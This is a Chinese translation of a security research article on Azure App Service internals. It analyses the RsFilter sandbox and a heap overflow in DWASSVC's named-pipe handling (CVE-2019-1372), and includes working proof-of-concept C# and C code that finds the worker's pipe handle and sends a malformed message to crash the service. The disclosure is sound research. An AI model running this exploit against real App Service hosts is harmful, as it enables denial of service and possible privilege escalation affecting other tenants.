> 原文链接: https://www.anquanke.com//post/id/197743 


# 远程云端执行（RCE）：Azure云架构中的漏洞分析（Part 2）


                                阅读量   
                                **828047**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者research.checkpoint.com，文章来源：checkpoint
                                <br>原文地址：[https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-ii/](https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-ii/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01ae67ffea770fb439.png)](https://p1.ssl.qhimg.com/t01ae67ffea770fb439.png)



## 0x00 前言

在前一篇文章中，我们讨论了Azure Stack体系架构，该架构可使用核心功能之外的功能进行扩展。由于我们可以离线研究云组件，因此可以借此机会研究Azure App Service。在本文中，我们将深入分析Azure App Service内部原理，检查其体系结构、攻击点，介绍我们在某个组件中找到的一个严重漏洞，该漏洞可以影响Azure云。



## 0x01 Azure App Service

根据微软描述，Azure App Service可以帮助用户使用自己选择的编程语言来构建并托管web应用、移动后端以及RESTful API，无需管理基础架构。Azure App Service提供了自动扩展及高可用特定，同时支持Windows及Linux，可以通过GitHub、Azure DevOps或者其他Git仓库进行自动部署。、



## 0x02 Azure App Service架构

> 备注：以下部分信息摘抄自[https://channel9.msdn.com/Events/Ignite/2016/BRK3206。](https://channel9.msdn.com/Events/Ignite/2016/BRK3206%E3%80%82)

Azure App Service架构可以分为如下6类角色：

1、Controller（控制器）

管理App Service：Controller管理并监控App Service，在其他角色中执行WinRM函数，以便部署软件并确保一切如期运转。

2、文件服务器

应用内容：存储tenant（租户）的应用及数据。

3、Management（管理）

API、UI扩展及数据服务：管理角色可以用来托管API、UI扩展、tenant门户以及管理员门户。

4、Front End（前端）

App Service路由：前端承担负载均衡器功能，位置在Azure/Azure Stack中所有软件负载均衡器之后，是App Service的负载均衡器，动态决定要将请求具体发送至哪个Web Worker。

5、Publisher（发布者）

FTP、Web Deploy：Publisher在Web Deploy端点中提供了一个FTP口，以便将所有tenant应用文件内容部署到文件服务器上。

6、Web Worker（Web工作者）

应用主机：托管应用的服务器，数量越多越好。这是我们主要感兴趣的部分，所有研究点都集中在这一部分。

现在我们已经知道App Service具有哪些角色，可以研究下这些角色之间如何相互交互（在默认的App Service配置下）：

[![](https://p5.ssl.qhimg.com/t0178937052aaf81199.png)](https://p5.ssl.qhimg.com/t0178937052aaf81199.png)



## 0x03 Web Worker

前面提到过，tenant应用运行在Web Worker主机中，这意味着应用可以使用支持的语言来运行任意代码。如果tenant决定运行恶意代码，破坏Web Worker主机或者其他正在运行的应用时，会出现什么情况？这是非常有趣的一个问题，但我们先要分析一些内部原理。



## 0x04 Microsoft Web Hosting Framework

代号为“Antares”，该框架提供了运行tenant应用的一个平台，包含如下几个组件：

### <a class="reference-link" name="DWASSVC"></a>DWASSVC

该服务负责管理并运行tenant应用。通常情况下，每个tenant应用会分配2个或更多个IIS工作进程（`w3wp.exe`）。第一个进程运行[Kudu](https://github.com/projectkudu/kudu)，以便tenant以简单且可访问的方式来管理自己的应用。第二个进程实际运行tenant应用。这些进程属于“完整版应用”，运行在权限相对较低的同一个用户上下文中。

[![](https://p4.ssl.qhimg.com/t0105a0e62cb0d0974a.png)](https://p4.ssl.qhimg.com/t0105a0e62cb0d0974a.png)

这个服务还有很多可研究点，回头我们再来讨论。

### <a class="reference-link" name="%E5%86%85%E6%A0%B8%E6%A8%A1%E5%BC%8F%E6%B2%99%E7%AE%B1"></a>内核模式沙箱

其中最有趣的一个组件为`RsFilter.sys`，这是一个过滤器驱动，是不包含公开符号的另一个Azure专有组件。关于这个组件，我们完全可以基于逆向分析单独开辟一篇文章。然而，这里我们仅简要介绍一下其主要功能：

1、进程创建/删除跟踪

该驱动会使用`PsSetCreateProcessNotifyRoutine`回调来跟踪每个进程创建或删除操作。

[![](https://p1.ssl.qhimg.com/t01052c07b86ad88457.png)](https://p1.ssl.qhimg.com/t01052c07b86ad88457.png)

内核中为“沙箱化进程”创建了2个主要结构。第一个结构我们称为`ProcessInfo`，其中包含进程相关信息，包括句柄、进程ID、映像文件名等。在IDA Pro中查看该结构，如下所示：

[![](https://p1.ssl.qhimg.com/t015035f9468674f0b1.png)](https://p1.ssl.qhimg.com/t015035f9468674f0b1.png)

创建（或收集）的第二个结构为`ProcessInfo`结构中的一个属性，我们称之为`SandboxSettings`。该结构非常庞大，包含关于进程沙箱环境的相关信息，比如进程/线程数限制、网络端口限制、环境路径等。部分片段摘抄如下：

[![](https://p4.ssl.qhimg.com/t01d9f3c596c701465f.png)](https://p4.ssl.qhimg.com/t01d9f3c596c701465f.png)

当`ProcessInfo`结构创建完毕后，会被插入一张全局表中，以便内核驱动跟踪。这里需要注意的一个有趣点是，同一个沙箱中的其他进程也能共享这个`SandboxSettings`。比如，tenant应用、其子进程以及Kudu虽然有不同的`ProcessInfo`结构，但都具有相同的`SandboxSettings`。

### <a class="reference-link" name="IOCTL%E5%8F%8AFltPort%E9%80%9A%E4%BF%A1"></a>IOCTL及FltPort通信

IOCTL及FltPort是用户空间到驱动程序的主要通信接口。某些IOCTL可以被任意用户调用，某些需要特定权限。连接到过滤端口（FLT）需要较高权限，修改沙箱设置可以通过该端口进行操作。

### <a class="reference-link" name="%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%87%E6%BB%A4%E5%99%A8"></a>文件系统过滤器

`RsFilter`注册了大量文件系统相关回调，以便正常处理相关事务。

[![](https://p2.ssl.qhimg.com/t01e4991a8209ca1520.png)](https://p2.ssl.qhimg.com/t01e4991a8209ca1520.png)

如果大家之前使用过Azure App Service，可能会知道应用可以访问`D:\home`，获取主目录。但大家是否想过其中的工作原理？比如每个tenant应用如何通过访问该路径来获取其对应的主目录？答案在`PreFilterOnCreateCallback`函数中。前面我们提到过`SandboxSettings`结构，其中有个`sandboxRemotePath`属性，该属性包含指向应用存储位置的一个UNC文件共享路径。DWASSVC会使用公开的过滤器端口（FltPort）与驱动通信，在IIS工作进程启动时设置该路径。因此，当应用尝试访问`D:\home`或者其他特定路径时，过滤器驱动会实时匹配并替换将路径替换为正确的路径值。

[![](https://p1.ssl.qhimg.com/t01b7f3ae942ff0844b.png)](https://p1.ssl.qhimg.com/t01b7f3ae942ff0844b.png)

[![](https://p2.ssl.qhimg.com/t015002a81e6dc8ebfb.png)](https://p2.ssl.qhimg.com/t015002a81e6dc8ebfb.png)

其他回调实现了文件系统限制功能，比如磁盘配额、目录/文件数量等。

### <a class="reference-link" name="%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E5%99%A8"></a>网络过滤器

网络过滤器实现了一些安全机制，避免出现数据泄漏，降低被攻击风险。网络过滤器包含端口白名单机制以及本地端口过滤机制。比如，用户的应用无法连接到未监听的本地端口。此外，这里还有最大连接数限制、网络IP地址范围白名单、禁用原始套接字等。

比如如下SMB 445及139端口黑名单机制（大家还记得WannaCry攻击事件吗？），有人能找到其中可能存在的bug吗？

[![](https://p4.ssl.qhimg.com/t0191811c384394692d.png)](https://p4.ssl.qhimg.com/t0191811c384394692d.png)

### <a class="reference-link" name="%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E6%B2%99%E7%AE%B1"></a>用户模式沙箱

每个IIS工作进程都会加载名为`RsHelper.dll`的一个DLL，该DLL使用微软的Detours库进行编译，hook了来自`kernel32.dll`、`advapi32.dll`、`ws2_32.dll`、`httpapi.dll`以及`ntdll.dll`等DLL中的大量函数。这里有趣的地方在于，该DLL还会hook `CreateProcessA`/`CreateProcessW`函数。当这些函数被调用时，该DLL会使用大家熟知的DLL注入技术（`CreateRemoteThread`），将自身注入到创建的进程中。观察被hook的函数，我们可以看到微软在实现上考虑得较为全面，以阻止tenant应用在Web Worker主机内部获取本不需要了解的相关信息。

如果大家想了解关于App Service沙箱的更多信息，可以参考[这篇文章](https://github.com/projectkudu/kudu/wiki/Azure-Web-App-sandbox)，其中详细介绍了其功能特性。我们可以确定的是，微软已经实现了大部分功能。然而我们并没有看到某些功能，比如对`Win32k.sys`（User32/GDI32）的限制。即便如此，该安全机制可能已经在公有云上实现。

理解App Service的工作原理后，现在我们可以开始在本地攻击场景中寻找漏洞。



## 0x05 漏洞细节

在本节中，我们将与大家分享我们在DWASSVC中找到的一个漏洞。利用该漏洞，我们可以以`NT AUTHORITY\SYSTEM`权限执行代码。

在研究过程中，我们使用了Process Explorer（来自SysInternals Suite的一款工具）来检查正在运行的进程，查看进程的执行方式、使用的命令行、模块等。我们在命令行中找到了一些有趣的参数：

[![](https://p2.ssl.qhimg.com/t014dbf4909c7f6f2d8.png)](https://p2.ssl.qhimg.com/t014dbf4909c7f6f2d8.png)

这里我们能看到`-a`参数以及一个命名管道路径。这里我们自然有些问题：通过该管道发送的是什么数据？我们是否可以影响这些数据？为了回答这些问题，我们首先需要理解谁创建了该管道，答案是DWASSVC启动了工作进程。DWASSVC采用C#编写，我们使用反编译器查看内部代码。在新的工作进程创建前，服务首先会创建命名管道，以便与之通信。我们可以查看经过反编译的`Microsoft.Web.Hosting.ProcessModel.dll`源码，在`WorkerProcess.cs:Start`中找到相应逻辑：

[![](https://p2.ssl.qhimg.com/t0127441d6eda3e6ea1.png)](https://p2.ssl.qhimg.com/t0127441d6eda3e6ea1.png)

`CreateIpmPipe`为原生函数，具体实现位于`DWASInterop.dll`中：

[![](https://p4.ssl.qhimg.com/t01b34ae6f8dd718222.png)](https://p4.ssl.qhimg.com/t01b34ae6f8dd718222.png)

为了能“深入”分析`DWASInterop.dll`，我们需要完全逆向分析其源码。由于没有公共符号，并且该DLL采用C++编写，因此我们花了一些时间才完成该任务。然而，这里有许多调试字符串，其中公开了一些函数名称，并且我们还注意到该DLL会与IIS的`iisutil.dll`共享代码（后者具有公共符号）。对两者进行比较后，我们可以加快逆向分析过程。

来看一下`CreateIpmPipe`的内部实现：

[![](https://p1.ssl.qhimg.com/t01412c03a31f98769c.png)](https://p1.ssl.qhimg.com/t01412c03a31f98769c.png)

可以看到其中调用了`CreateIpmMessagePipe`内部函数：

[![](https://p3.ssl.qhimg.com/t01709afd2be8962ee3.png)](https://p3.ssl.qhimg.com/t01709afd2be8962ee3.png)

`CreateIpmMessagePipe`会调用`CreateNamedPipeW`来创建命名管道。如果观察函数参数，可以看到该函数使用了`PIPE_ACCESS_DUPLEX`，这意味着该管道为双向管道，服务端（DWASSVC）及客户端（`w3wp.exe`）可以读取并写入该管道。随后工作流执行完毕，结果返回C#程序。当代码返回时，DWASSVC会启动工作进程，将管道名以参数形式（`-a`标志）传入。工作进程启动后，会连接至管道，然后开始通信。

现在我们知道管道的创建方式，但该管道有什么作用呢？答案是进程间通信。比如，如果不想粗暴地杀掉工作进程，DWASSVC可以向其发送关闭请求，也就是“Worker Shutdown Request”消息。当然这里还有其他一些消息格式，但我们对协议本身的实现比较感兴趣，想看一下能否找到其中存在的漏洞。

工作进程可以发送给DWASSVC服务的消息结构如下所示，我们将该结构命名为`WorkerItem`：

|字段|描述
|------
|DWORD opcode（4字节）|The operation code
|DWORD dataLength（4字节）|The length of the data
|data|The actual data

当DWASSVC收到消息后（`DWASInterop.dll`），会调用`IPM_MESSAGE_PIPE::MessagePipeCompletion`回调来处理。传递给该回调的第一个（也是唯一一个参数）为一个`IPM_MESSAGE_IMP`实例。

`IPM_MESSAGE_IMP`是比较特殊的一个类，`DWASInterop`使用该类来描述具体消息。该类并没有太多字段，我们逆向出的部分字段如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01358f1b282a0c46f1.png)

该结构中包含指向`workerItem`的一个指针，也包含名为`workerItemSize`的一个属性，该属性值为`workerItem`的大小。`workerItemSize`中保存`workerItem`的完整大小（及`opcode + length + data`），而`workerItem.dataLength`只保存了`data`字段的大小。

当`IPM_MESSAGE_PIPE::MessagePipeCompletion`收到消息时，会存在一个有趣的边缘情况：

[![](https://p4.ssl.qhimg.com/t01023cdfa9e9f84d7e.png)](https://p4.ssl.qhimg.com/t01023cdfa9e9f84d7e.png)

当读取数据时，会调用`ReallocateWorkerItem`函数。

[![](https://p2.ssl.qhimg.com/t0178edb2dd8569685f.png)](https://p2.ssl.qhimg.com/t0178edb2dd8569685f.png)

代码会为`newWorkerItem`简单分配空间，然后将之前的数据拷贝到新结构中。

当调用该函数时，会传入`workerItem-&gt;dataLength`，然后使用传入的大小分配空间。然而，`memcpy`操作会根据`workerItemSize`执行。如果通过`DWASInterop.dll`或`iisutil.dll`公开的API（`WriteMessage` API函数）来发送消息，那么这两个大小值会被自动计算。然而，如果攻击者可以将消息直接发送至命名管道，那么就可以发送如下类似的消息：

|字段|取值
|------
|DWORD opcode（4字节）|0x16（此时具体值无关紧要）
|DWORD dataLength（4字节）|0
|data|A * 100（比较长的一个字符串）

此时`workerItemSize`会被计算为`108`，而`workerItem-&gt;dataLength`的值为`0`。在这种情况下，大小为`0`的分配操作会执行成功，而`memcpy`会使用大小为`108`这个值在分配的空间上执行操作，导致出现堆溢出现象，并且攻击者可以控制其内容及大小。

那么攻击者如何向DWASSVC（`DWASInterop.dll`）发送消息呢？根据微软的设计，在运行C# Azure函数时，函数会运行在工作进程（`w3wp.exe`）的上下文中。这样攻击者就有可能枚举当前已打开的句柄，通过这种方式，找到已打开的命名管道句柄，发送精心构造的消息。我们触发漏洞的方式如下所示：

```
using System.Net;
using System.Runtime.InteropServices;
[DllImport("YOUR_DLL_NAME")]
public static extern void load();
public static async Task&lt;HttpResponseMessage&gt; Run(HttpRequestMessage req, TraceWriter log)
`{`
    load();
    log.Info("C# HTTP trigger function processed a request.");
    return req.CreateResponse(HttpStatusCode.OK, "Malicious Function");
`}`
```

我们创建了一个C# Azure函数，用来加载原生DLL，调用`load`函数。

```
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#pragma warning(disable: 4996)
#define MAX_PATH_LEN 2048
#define MAX_BUFF_LEN 2048
#define IPM_BUFFER_LEN(0x800)

typedef struct _pipedata `{`
  unsigned int opcode;
  unsigned int length;
  char data[IPM_BUFFER_LEN];
`}`
PIPE_DATA;

extern "C"
__declspec(dllexport) int load(void) `{`
  FILE * fh = NULL;

  char path[256];
  sprintf(path, "D:\\home\\output_%d_.txt", GetCurrentProcessId());
  fh = fopen(path, "wb");

  if (NULL != fh) `{`
    int i = 0;
    for (i = 1; i &lt; 10000; i++) `{`
      DWORD type = GetFileType((HANDLE) i);

      if (FILE_TYPE_PIPE == type) `{`
        PFILE_NAME_INFO fi;
        DWORD structSize = (MAX_PATH_LEN * sizeof(wchar_t)) + sizeof(FILE_NAME_INFO);
        fi = (PFILE_NAME_INFO) malloc(structSize);

        if (fi == NULL)
          continue;

        memset(fi, 0, structSize);

        if (NULL != fi) `{`
          if (GetFileInformationByHandleEx((HANDLE) i, FileNameInfo, fi, structSize)) `{`
            if (wcsstr(fi - &gt; FileName, L "iisipm")) `{`
              fprintf(fh, "Pipe: %x - %S\n", i, fi - &gt; FileName);
              fflush(fh);

              DWORD writtenBytes = 0;
              OVERLAPPED overlapped;
              memset( &amp; overlapped, 0, sizeof(OVERLAPPED));

              PIPE_DATA pipedata;
              memset( &amp; pipedata, 'a', sizeof(PIPE_DATA));

              pipedata.opcode = 0x0A;
              pipedata.length = 0;
              if (WriteFile((HANDLE) i, &amp; pipedata, sizeof(PIPE_DATA), &amp; writtenBytes, &amp; overlapped)) `{`
                fprintf(fh, "Successfully writen: %d bytes into %d\n", writtenBytes, i);
                fflush(fh);
              `}` else `{`
                fprintf(fh, "Failed to write into %d\n", i);
                fflush(fh);
              `}`
            `}`
          `}` else `{`
            fprintf(fh, "Error: %x, %d\n", i, GetLastError());
            fflush(fh);
          `}`

          free(fi);
        `}`
      `}`
    `}`
    fclose(fh);
  `}`

  return 0;
`}`

BOOL APIENTRY DllMain(HMODULE hModule,
  DWORD ul_reason_for_call,
  LPVOID lpReserved
) `{`
  switch (ul_reason_for_call) `{`
  case DLL_PROCESS_ATTACH:
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  `}`
  return TRUE;
`}`
```

`load`函数会暴力枚举句柄，直到找到名称以`iisipm`开头的已打开句柄，然后构造恶意消息，立即发送该消息。执行代码后，DWASSVC会如期崩溃。

虽然我们只演示了崩溃场景，该漏洞还是可以用来实现权限提升。



## 0x06 漏洞影响

微软提供了各种App Service计划：

1、共享计算：Free及Shared，这两个基础层与其他App Service应用（包括其他客户的应用）在同一个Azure VM上运行app。这些层将为运行在共享资源上的每个app分配CPU限额，相关资源无法扩展。

2、专用计算：Basic、Standard、Premium及PremiumV2层在专用Azure VM上运行app。只有相同App Service计划中的应用能分享相同的计算资源。层级越高，我们能使用更多的VM实例来扩展。

3、隔离：这一层在Azure虚拟网络上运行专用Azure VM，以计算隔离为基础，为app提供网络隔离机制，也提供最大尺度的扩展功能。

如果大家想了解更多细节，可参考[官方文档](https://docs.microsoft.com/en-us/azure/app-service/overview-hosting-plans)。

如果在这些计算中利用该漏洞，我们就可以破坏微软的App Service基础设施。然而，如果在Free/Shared计划上利用该漏洞，我们还能攻击其他tenant的应用、数据甚至账户。这样一来，攻击者就能成功打破App Service的安全模型。



## 0x07 总结

云并不是一个神奇的地方，尽管大家认为云端比较安全，但云端归根结底也是一种基础设施，可能包含存在漏洞的代码，本文就是非常典型的一个案例。

微软已经公开并[修复](//portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1372))了该漏洞，漏洞编号为CVE-2019-1372，官方确认该漏洞会影响Azure Cloud以及Azure Stack。
